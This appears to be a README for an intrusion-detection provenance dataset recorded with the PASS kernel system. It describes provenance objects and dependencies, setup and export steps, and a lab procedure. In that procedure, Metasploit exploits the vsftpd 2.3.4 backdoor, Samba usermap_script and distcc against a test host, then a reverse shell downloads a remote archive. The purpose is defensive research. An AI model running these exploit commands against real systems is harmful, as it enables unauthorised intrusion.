PASS system intercepts related system calls to generate provenance information. When an event occurs, the corresponding system call is triggered. This dataset distinguishes the same processes by version, ensuring that no dependency loops occur, eg. P.0->A->P.1. In addition to dependency properties (such as INPUT, GENERATEDBY, FORKPARENT, RECV, and SEND), the object's own properties (such as NAME, ENV, ARGV, PID, EXECTIME, and TYPE are also collected. It does not make any sense to have a single object. What matters is the dependencies between the objects. Pass mainly records the dependencies between objects and objects. Where P->A, indicating that P depends on A.

The main three types of objects are collected: File object: The attributes include specific information about the file itself, such as file name, file storage space, storage location, and file node number. Process object: The attributes mainly contain the process name, the PID number of the process, and environment variables; the process creation time and related messages from the group may also covered when requirements are given. Network connection object: it used to record the transmission of data on the network. Since many attacks are generated through the network, it is not enough to record objects such as files, processes, and pipes. Therefore, the system defines network connection objects to collect traceability information of files copied from the storage system. Network connection objects can be considered as file objects, the attributes of which include the source port, the destination port, the source IP address, and the destination IP address. 

The main three types of dependencies are collected: (1) FORKPARENT: Process to Process, if a process P creates process Q, the traceability record Q FORKPARENT P is generated, that is, Q->P. (2) INPUT: Process to File, if a process P reads the contents of the file A, the traceability record P INPUT A is generated, that is P->A. (3) GENERATEDBY: Network connection object to Process, if a process P sends data from the network connection object B, the traceability record B GENERATEDBY P is generated, that is, B->P.


Prerequisites:
The linux (v2.6.23.17) should be installed
The gcc (v4.3.2) should be installed
The PASS (V2) should be installed
The passtools should be installed
The BerkeleyDB (version 4.6.21) should be installed

passtools£ºuserlevel tools needed for use with the PASS kernel.
Note that you are required to copy the mount.lasagna file in the mount.lasagna directory of the passtool to the /sbin directory, that will invoke the mount.lasagna script when run the mount -t lasagna command.
The installation directory of passtools in our machine is /media/passtools-20101210
The stuff in this directory:
	libtwig - library for working with the "twig" log format.
	libwdb - library for working with the lasagna/waldo databases.
	sage - query engine.
	waldo - kernel remote manipulation tool for lasagna fs.
	convert2xml - program to dump a lasagna/waldo database as XML.
	twig_dump - program to dump a twig log file.
	wdb_dump - program to dump a lasagna/waldo database.
Using PASS:
Collecting normal data
Step 1.Mount the pass system
Add a disk device /dev/sdb to the virtual machine, and then partition the device, eg./dev/sdb1
      mkfs -t lasagna /dev/sdb1 ------------------------------------------------------------Initialization
      mount -t lasagna /dev/sdb1  /mnt/pass

      mount -t ext3 /dev/sdb1 /mnt/pass --------------------------------------------------mount ext3
Step 2. Export the collected provenance data
       cd /mnt/pass/.lasagna_stuff/
      /media/passtools-20101210/waldo/waldo -o -p  db/ k00000000001.twig       ----Write twig to the database db
      /media/passtools-20101210/twig_dump/twig_dump k00000000001.twig>/root/1111.txt  ---Convert .twig to .txt
	  
Collecting abnormal or intrusion data:
The test includes two computers, one for the intrusion detection server and one for the attack source machine. 
The pass system is fitted to the intrusion detection server.
A Linux virtual machine is fitted to the attack source machine and Metaspolit (v5.0.16) is installed.
After the completion of step 1, open the vulnerable program such as Vsftp(v2.3.4),Samba(v3.0.21),Distcc(2.16),etc.
  step 3 Open the vulnerable program   
      /usr/local/sbin/vsftpd&-----------------------------------------------open the vulnerable program 
  Step 4 Invade with an attacking machine
      >msfconsole
      msf> use exploit/unix/ftp/vsftpd_234_backdoor
      msf> set RHOST 192.168.159.128 (intrusion detection server's IP)
      msf> exploit
  After the attack succeeds, you can obtain a reverse shell from the server and perform the following operations.
       ls
       wget https://www.kernel.org/pub/linux/libs/klibc/2.0/klibc-2.0.1.tar.bz2
       tar -xjvf klibc-2.0.1.tar.bz2
       cat index.html
 This process simulates an attacker downloading a malicious program from the Internet and decompressing it, and then reads the system's confidential file.
  Step 2 to obtain intrusion data.
 
 Samba vulnerability attack
       > msfconsole
      msf> use exploit/mulit/samba/usermap_script
      msf> set RHOST 192.168.159.128   
      msf> exploit

Distcc vulnerability attack
    > msfconsole
    msf > use exploit/unix/misc/distcc_exec
    msf> set RHOST 192.168.159.128   
    msf> exploit

Of course, you can also use other vulnerabilities to attack.
